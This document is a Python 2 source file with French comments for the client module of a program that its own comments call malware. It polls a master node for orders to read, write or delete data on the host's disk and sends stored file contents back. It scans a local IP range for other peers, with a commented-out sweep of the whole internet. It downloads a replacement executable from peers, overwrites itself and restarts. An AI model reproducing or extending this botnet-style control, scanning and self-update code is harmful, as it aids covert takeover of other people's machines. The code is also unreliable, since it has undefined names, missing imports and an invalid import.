#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys, shutil
import logging
import logging.handlers
import threading
import time.sleep
import hashlib.sha256
from Crypto.PublicKey.RSA import importKey
import urllib, urllib2
from xml.dom import minidom
import re
from objet import *

main = sys.modules['__main__']

def post(ip, port, page, valeur) :
	"""
	Fonction
	"""
	# On prépare la requête
	url = "http://{0}:{1}/{2}".format(ip, port, page)
	#log.debug("post()", url)
	donnees = urllib.urlencode(valeur)
	requete = urllib2.Request(url, donnees)
	
	# On envoie la requete
	try : return urllib2.urlopen(requete, None, 5)
	except urllib2.URLError : return None

	
def ecouter_master() :
	"""
	Fonction s'informant en continu des ordres à executer ('r', 'w', '-')
	"""
	while True :
		if main.maconf.master.id \
		and (main.maconf.master.id != main.maconf.moi.id) :
			
			# On demande le XML
			valeur = {"id" : main.maconf.moi.id}
			retour = post(main.maconf.master.ip, main.maconf.master.port, "commande.xml", valeur)
			try :
				retour_xml = minidom.parse(retour)
				
			except AttributeError :
				# Le master est injoignable
				time.sleep(1)  # 3600 (1 heure)
				continue
			
			# On annalyse quel est l'ordre (r/w/-) et le chunk concerné
			try :
				ordre = retour_xml.getElementsByTagName('ordre')[0].childNodes[0].nodeValue
				
			except IndexError :
				# Le master n'a pas d'ordre pour nous
				time.sleep(1)  # 600 (10 minutes)
				continue
			
			unchunk = Chunk()
			unchunk.id = retour_xml.getElementsByTagName('id')[0].childNodes[0].nodeValue
			
			if ordre == 'r' :
				
				# On envoie le chunk
				unchunk.donnees = open("donnees/" + unchunk.id, 'rb').read()
				valeur = {"id" : main.maconf.moi.id, "chunk" : chunk.id, "donnees" : chunk.donnees}
				post(main.maconf.master.ip, main.maconf.master.port, "commande.xml", valeur)
				
			elif ordre == 'w' :
				
				# On enregistre le chunk sur le disque dur
				unchunk.donnees = retour_xml.getElementsByTagName('donnees')[0].childNodes[0].nodeValue
				message = "{0.id}\n{0.fichier_id}\n{0.date}".format(unchunk)
				if main.maconf.master.cle.verify(message, (unchunk.signature, )) \
				and hashlib.sha256(unchunk.donnees) == unchunk.id :
					open("donnees/" + unchunk.id, 'wb').write(unchunk.donnees)
				
				# On dit que c'est bon
				valeur = {"id" : main.maconf.moi.id, "chunk" : chunk.id, "donnees" : ordre}
				post(main.maconf.master.ip, main.maconf.master.port, "commande.xml", valeur)
				
			elif ordre == '-' :
				
				# On supprime le chunk du stockage
				try : os.remove("donnees/" + unchunk.id)
				except OSError : pass
				
				# On dit que c'est bon
				valeur = {"id" : main.maconf.moi.id, "chunk" : chunk.id, "donnees" : ordre}
				post(main.maconf.master.ip, main.maconf.master.port, "commande.xml", valeur)
			
		else :
			time.sleep(3600)  # 1 heure


def attaque(ip, port) :
	"""
	Fonction 
	"""
	# On demande le XML de la paire
	valeur = {"ip" : main.maconf.moi.ip, "port" : main.maconf.moi.port}
	retour = post(ip, port, "bdd.xml", valeur)
	
	# Si la paire est injoignable on arrête là
	try : retour_xml = minidom.parse(retour)
	except AttributeError : return None
	
	# On met à jour nos paramêtres
	try :
		e = retour_xml.getElementsByTagName('master')[0]
		unmaster = Master()
		unmaster.id = int(e.getElementsByTagName('id')[0].childNodes[0].nodeValue)
		unmaster.sha256 = str(e.getElementsByTagName('sha256')[0].childNodes[0].nodeValue)
		unmaster.date = float(e.getElementsByTagName('date')[0].childNodes[0].nodeValue)
		unmaster.signature = long(e.getElementsByTagName('signature')[0].childNodes[0].nodeValue)
		
		message = '{0.id}\n{0.sha256}\n{0.date}'.format(unmaster)
		if main.maconf.master.cle.verify(message, (unmaster.signature, )) \
		and main.maconf.master.date < unmaster.date :
			main.maconf.master = unmaster
			main.maconf.master.save()
			log.debug("ICI", "mis à jour du master")
			main.status = "reload"
		
	except IndexError : pass
	
	# On enrichie notre liste de contacts
	for e in retour_xml.getElementsByTagName('paire') :
		unepaire = Paire()
		unepaire.id = int(e.getElementsByTagName('id')[0].childNodes[0].nodeValue)
		unepaire.ip = str(e.getElementsByTagName('ip')[0].childNodes[0].nodeValue)
		unepaire.port = int(e.getElementsByTagName('port')[0].childNodes[0].nodeValue)
		unepaire.espace = int(e.getElementsByTagName('espace')[0].childNodes[0].nodeValue)
		unepaire.espace_consome = int(e.getElementsByTagName('espace_consome')[0].childNodes[0].nodeValue)
		unepaire.privilege = str(e.getElementsByTagName('privilege')[0].childNodes[0].nodeValue)
		unepaire.systeme = str(e.getElementsByTagName('systeme')[0].childNodes[0].nodeValue)
		unepaire.arch = str(e.getElementsByTagName('arch')[0].childNodes[0].nodeValue)
		unepaire.sha256 = str(e.getElementsByTagName('sha256')[0].childNodes[0].nodeValue)
		unepaire.date = float(e.getElementsByTagName('date')[0].childNodes[0].nodeValue)
		unepaire.cle = importKey(e.getElementsByTagName('cle')[0].childNodes[0].nodeValue)
		unepaire.signature = long(e.getElementsByTagName('signature')[0].childNodes[0].nodeValue)
		unepaire.score = [int(f) for f in e.getElementsByTagName('score')[0].childNodes[0].nodeValue.split()]
		unepaire.date_score = float(e.getElementsByTagName('date_score')[0].childNodes[0].nodeValue)
		unepaire.signature_score = long(e.getElementsByTagName('signature_score')[0].childNodes[0].nodeValue)
		
		# Si la paire existe déjà et qu'elle authentifie ses modification 
		message = '{0.id}\n{0.ip}\n{0.port}\n{0.espace}\n\
			{0.espace_consome}\n{0.privilege}\n{0.systeme}\n\
			{0.arch}\n{0.sha256}\n{0.date}'.format(unepaire)
		if main.maconf.paires.has_key(unepaire.id) :
			if main.maconf.paires[unepaire.id].date < unepaire.date \
			and main.maconf.paires[unepaire.id].cle.verify(message1, (unepaire.signature, )) :
				main.maconf.paires[unepaire.id].id = unepaire.id
				main.maconf.paires[unepaire.id].ip = unepaire.ip
				main.maconf.paires[unepaire.id].port = unepaire.port
				main.maconf.paires[unepaire.id].espace = unepaire.espace
				main.maconf.paires[unepaire.id].espace_consome = unepaire.espace_consome
				main.maconf.paires[unepaire.id].privilege = unepaire.privilege
				main.maconf.paires[unepaire.id].systeme = unepaire.systeme
				main.maconf.paires[unepaire.id].arch = unepaire.arch
				main.maconf.paires[unepaire.id].sha256 = unepaire.sha256
				main.maconf.paires[unepaire.id].date = unepaire.date
				main.maconf.paires[unepaire.id].signature = unepaire.signature
			
		# ou qu'on ne la posède pas mais que les paramêtres sont bon
		elif unepaire.cle.verify(message, (unepaire.signature, )) :
			main.maconf.paires[unepaire.id] = Paire()
			main.maconf.paires[unepaire.id].id = unepaire.id
			main.maconf.paires[unepaire.id].ip = unepaire.ip
			main.maconf.paires[unepaire.id].port = unepaire.port
			main.maconf.paires[unepaire.id].espace = unepaire.espace
			main.maconf.paires[unepaire.id].espace_consome = unepaire.espace_consome
			main.maconf.paires[unepaire.id].privilege = unepaire.privilege
			main.maconf.paires[unepaire.id].systeme = unepaire.systeme
			main.maconf.paires[unepaire.id].arch = unepaire.arch
			main.maconf.paires[unepaire.id].sha256 = unepaire.sha256
			main.maconf.paires[unepaire.id].date = unepaire.date
			main.maconf.paires[unepaire.id].signature = unepaire.signature
			main.maconf.paires[unepaire.id].cle = unepaire.cle
		
		# On met à jour les scores
		if main.maconf.paires.has_key(unepaire.id) :
			message = '{0.id}\n{0.score}\n{0.date_score}'.format(unepaire)
			if main.maconf.paires[unepaire.id].date_score < unepaire.date_score \
			and main.maconf.master.cle.verify(message, (unepaire.signature_score, )) :
				main.maconf.paires[unepaire.id].score = unepaire.score
				main.maconf.paires[unepaire.id].date_score = unepaire.date_score
				main.maconf.paires[unepaire.id].signature_score = unepaire.signature_score
			
			# On sauvegarde en base de données
			main.maconf.paires[unepaire.id].save()
		
	# On enrichie notre liste de fichier
	for e in retour_xml.getElementsByTagName('fichier') :
		unfichier = Fichier()
		unfichier.id = int(e.getElementsByTagName('id')[0].childNodes[0].nodeValue)
		unfichier.nom = str(e.getElementsByTagName('nom')[0].childNodes[0].nodeValue)
		unfichier.date = float(e.getElementsByTagName('date')[0].childNodes[0].nodeValue)
		unfichier.poids = int(e.getElementsByTagName('poids')[0].childNodes[0].nodeValue)
		unfichier.signature = long(e.getElementsByTagName('signature')[0].childNodes[0].nodeValue)
		
		message = '{0.id}\n{0.nom}\n{0.date}\n{0.poids}'.format(unfichier)
		if main.maconf.master.cle.verify(message, (unfichier.signature, )) :
			
			# On enregistre les chunks lié au fichier
			for f in e.getElementsByTagName('chunk') :
				unchunk = Chunk()
				unchunk.id = int(e.getElementsByTagName('id')[0].childNodes[0].nodeValue)
				unchunk.fichier_id = unfichier.id
				unchunk.date = float(e.getElementsByTagName('date')[0].childNodes[0].nodeValue)
				unchunk.signature = long(e.getElementsByTagName('signature')[0].childNodes[0].nodeValue)
				
				message = '{0.id}\n{0.fichier_id}\n{0.date}'.format(unchunk)
				if main.maconf.master.cle.verify(message, (unchunk.signature, )) :
					
					# On enregistre la paire qui stocke le chunk (directement en base de données)
					for id in f.getElementsByTagName('stockeur')[0].childNodes[0].nodeValue :
						unchunk.stockeurs.append(int(id))
					
					unfichier.chunks[unchunk.id] = unchunk
			
			main.maconf.fichiers[unfichier.id] = unfichier
			main.maconf.fichiers[unfichier.id].save()
	
	# On enrichie notre liste de xor
	for e in retour_xml.getElementsByTagName('xor') :
		unxor = Xor()
		unxor.id,unxor.a,unxor.b = [int(f.nodeValue) for f in e.getElementsByTagName('chunk')[0].childNodes[0]]
		
		main.maconf.xors[unxor.id] = unxor
		main.maconf.xors[unxor.id].save()
	
	# On enrichie notre liste d'utilisateur
	for e in retour_xml.getElementsByTagName('utilisateur') :
		unutilisateur = Utilisateur()
		unutilisateur.id = str(e.getElementsByTagName('id')[0].childNodes[0].nodeValue)
		unutilisateur.mot_de_passe = str(e.getElementsByTagName('mot_de_passe')[0].childNodes[0].nodeValue)
		unutilisateur.courriel = str(e.getElementsByTagName('courriel')[0].childNodes[0].nodeValue)
		unutilisateur.date = float(e.getElementsByTagName('date')[0].childNodes[0].nodeValue)
		unutilisateur.signature = long(e.getElementsByTagName('signature')[0].childNodes[0].nodeValue)
		
		message = '{0.id}\n{0.mot_de_passe}\n{0.courriel}\n{0.date}'.format(unutilisateur)
		if ((main.maconf.utilisateurs.has_key(unutilisateur.id) \
		and main.maconf.utilisateurs[unutilisateur.id].date < unutilisateur.date) \
		or not main.maconf.utilisateurs.has_key(unutilisateur.id)) \
		and main.maconf.master.cle.verify(message, (unutilisateur.signature, )) :
			main.maconf.xors[unutilisateur.id] = unutilisateur
			main.maconf.xors[unutilisateur.id].save()


def ecouter_paire() :
	"""
	Fonction mettant à jour nos données
	"""
	while True :
		for unepaire in main.maconf.paires.values() :
			if not unepaire.ip in [main.maconf.moi.ip, main.maconf.master.ip] :
				#log.debug("ICI", "ecouter_paire()")
				attaque(unepaire.ip, unepaire.port)
		
		time.sleep(600)  # 10 minutes


def explorer() :
	"""
	Fonction explorant le réseau à la recherche d'autres paires
	"""
	while True :
		# On balaille les contacts enregistré après qu'ils nous aient intérrogé
		if main.maconf.contacts :
			for uncontact in main.maconf.contacts.values() :
				if uncontact.ip != main.maconf.moi.ip :
					#log.debug("attaque", "contact")
					attaque(uncontact.ip, uncontact.port)
				
				main.maconf.contacts.pop(uncontact.ip)
			
		else :
			# On cherche sur pastebin, anonpaste ou shodan
			"""<chercher des serveur web qui repondent 418>"""
			
			# On balaille (déséspérement) internet
			"""for w in range(0,255) :
				if w in [0,10,127] : continue
				
				for x in range(0,255) :
					if "{0}.{1}".format(w,x) in ["169.254","192.168"] : continue
					
					for y in range(0,255) :
						if "{0}.{1}.{2}".format(w,x,y) in ["192.0.0","192.0.2","192.88.99","198.51.100","203.0.113"] : continue
						
						for z in range(0,255) :
							if "{0}.{1}.{2}.{3}".format(w,x,y,z) in [moi.ip,"255.255.255.255"] : continue
							
							attaque("{0}.{1}.{2}.{3}".format(w,x,y,z), 1212)"""
			
			# DEBOGUE => On balaille le réseau local
			for i in range(10,30) :
				ip = "192.168.99." + str(i)
				if ip != main.maconf.moi.ip :
					#log.debug("attaque", "plage")
					attaque(ip, 1212)
		
		time.sleep(3600)  # 1 heure


def maj_ip() :
	"""
	Fonction mettant à jour notre IP si elle a changée
	"""
	while True :
		#try :
			##log.debug("ICI", "mon-ip.com")
			#opener = urllib2.build_opener()
			#opener.addheaders = [('User-agent', 'Mozilla/5.0')]
			#html = opener.open("http://mon-ip.com/").read()
			#regex = re.compile("<span id=\"ip\">([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})</span>")
			#ip = regex.findall(html)[0]
			
		#except urllib2.URLError :
			##log.debug("ICI", "showmyip.co")
			#ip_xml = minidom.parse(urllib2.urlopen("http://www.showmyip.com/xml/"))
			#ip = str(ip_xml.getElementsByTagName('ip')[0].childNodes[0].nodeValue)
		
		import socket
		s = socket.socket()
		s.connect(("google.fr",80))
		ip = s.getsockname()[0]
		s.close()
		
		if main.maconf.moi.ip != ip :
			main.maconf.moi.date = time.time()
			#log.debug("moi.date", main.maconf.moi.date)
			message = "{0.id}\n{0.ip}\n{0.port}\n{0.espace}\n\
				{0.espace_consome}\n{0.privilege}\n{0.systeme}\n\
				{0.arch}\n{0.sha256}\n{0.date}".format(main.maconf.moi)
			main.maconf.moi.signature = main.maconf.moi.cle_privee.sign(message, None)[0]
			#log.debug("moi.signature", main.maconf.moi.signature)
			main.maconf.moi.save()
			log.debug("ICI", "mise a jour de l'IP")
		
		time.sleep(3600)  # 1 heure


def mise_a_jour() :
	"""
	Fonction mettant à jour notre IP si elle a changée
	"""
	while True :
		
		time.sleep(3600)  # 1 heure
		for unepaire in [unepaire for unepaire in [unepaire for unepaire \
		in main.maconf.paires.values() if unepaire.date > main.maconf.moi.date] \
		if unepaire.systeme == main.maconf.moi.systeme
		and unepaire.arch == main.maconf.moi.arch] :
			valeur = {"id" : main.maconf.moi.id}
			retour = post(ip, port, "mise_a_jour", valeur)
			contenu = retour.read()
			
			if hashlib.sha256(contenu).hexdigest() == unepaire.sha256 :
				shutil.move(main.maconf.executable, main.maconf.executable + ".old")
				open(main.maconf.executable, 'w').write(contenu)
				os.chmod(main.maconf.executable, stat.S_IRWXU)
				log.debug("ICI", "mise à jour du logiciel")
				main.status = "restart"
				log.debug("main.status", main.status)
		
		time.sleep(3600)  # 1 heure


def client() :
	"""
	Fonction 
	"""
	# On va voir si le master a des ordres pour nous
	thread_ecouter_master = threading.Thread(target=ecouter_master)
	thread_ecouter_master.start()
	time.sleep(1)  # 60
	
	# On va voir si les paires ont du nouveau
	thread_ecouter_paire = threading.Thread(target=ecouter_paire)
	thread_ecouter_paire.start()
	time.sleep(1)  # 60
	
	# On va voir si d'autre paire ne serai pas quelque part
	thread_explorer = threading.Thread(target=explorer)
	thread_explorer.start()
	time.sleep(1)  # 60
	
	# On garde un oeil sur notre IP
	thread_maj_ip = threading.Thread(target=maj_ip)
	thread_maj_ip.start()
	time.sleep(1)  # 60
	
	# On reste a l'afu d'une nouvelle version du malware
	thread_mis_a_jour = threading.Thread(target=mise_a_jour)
	thread_mis_a_jour.start()
	time.sleep(1)  # 60
	
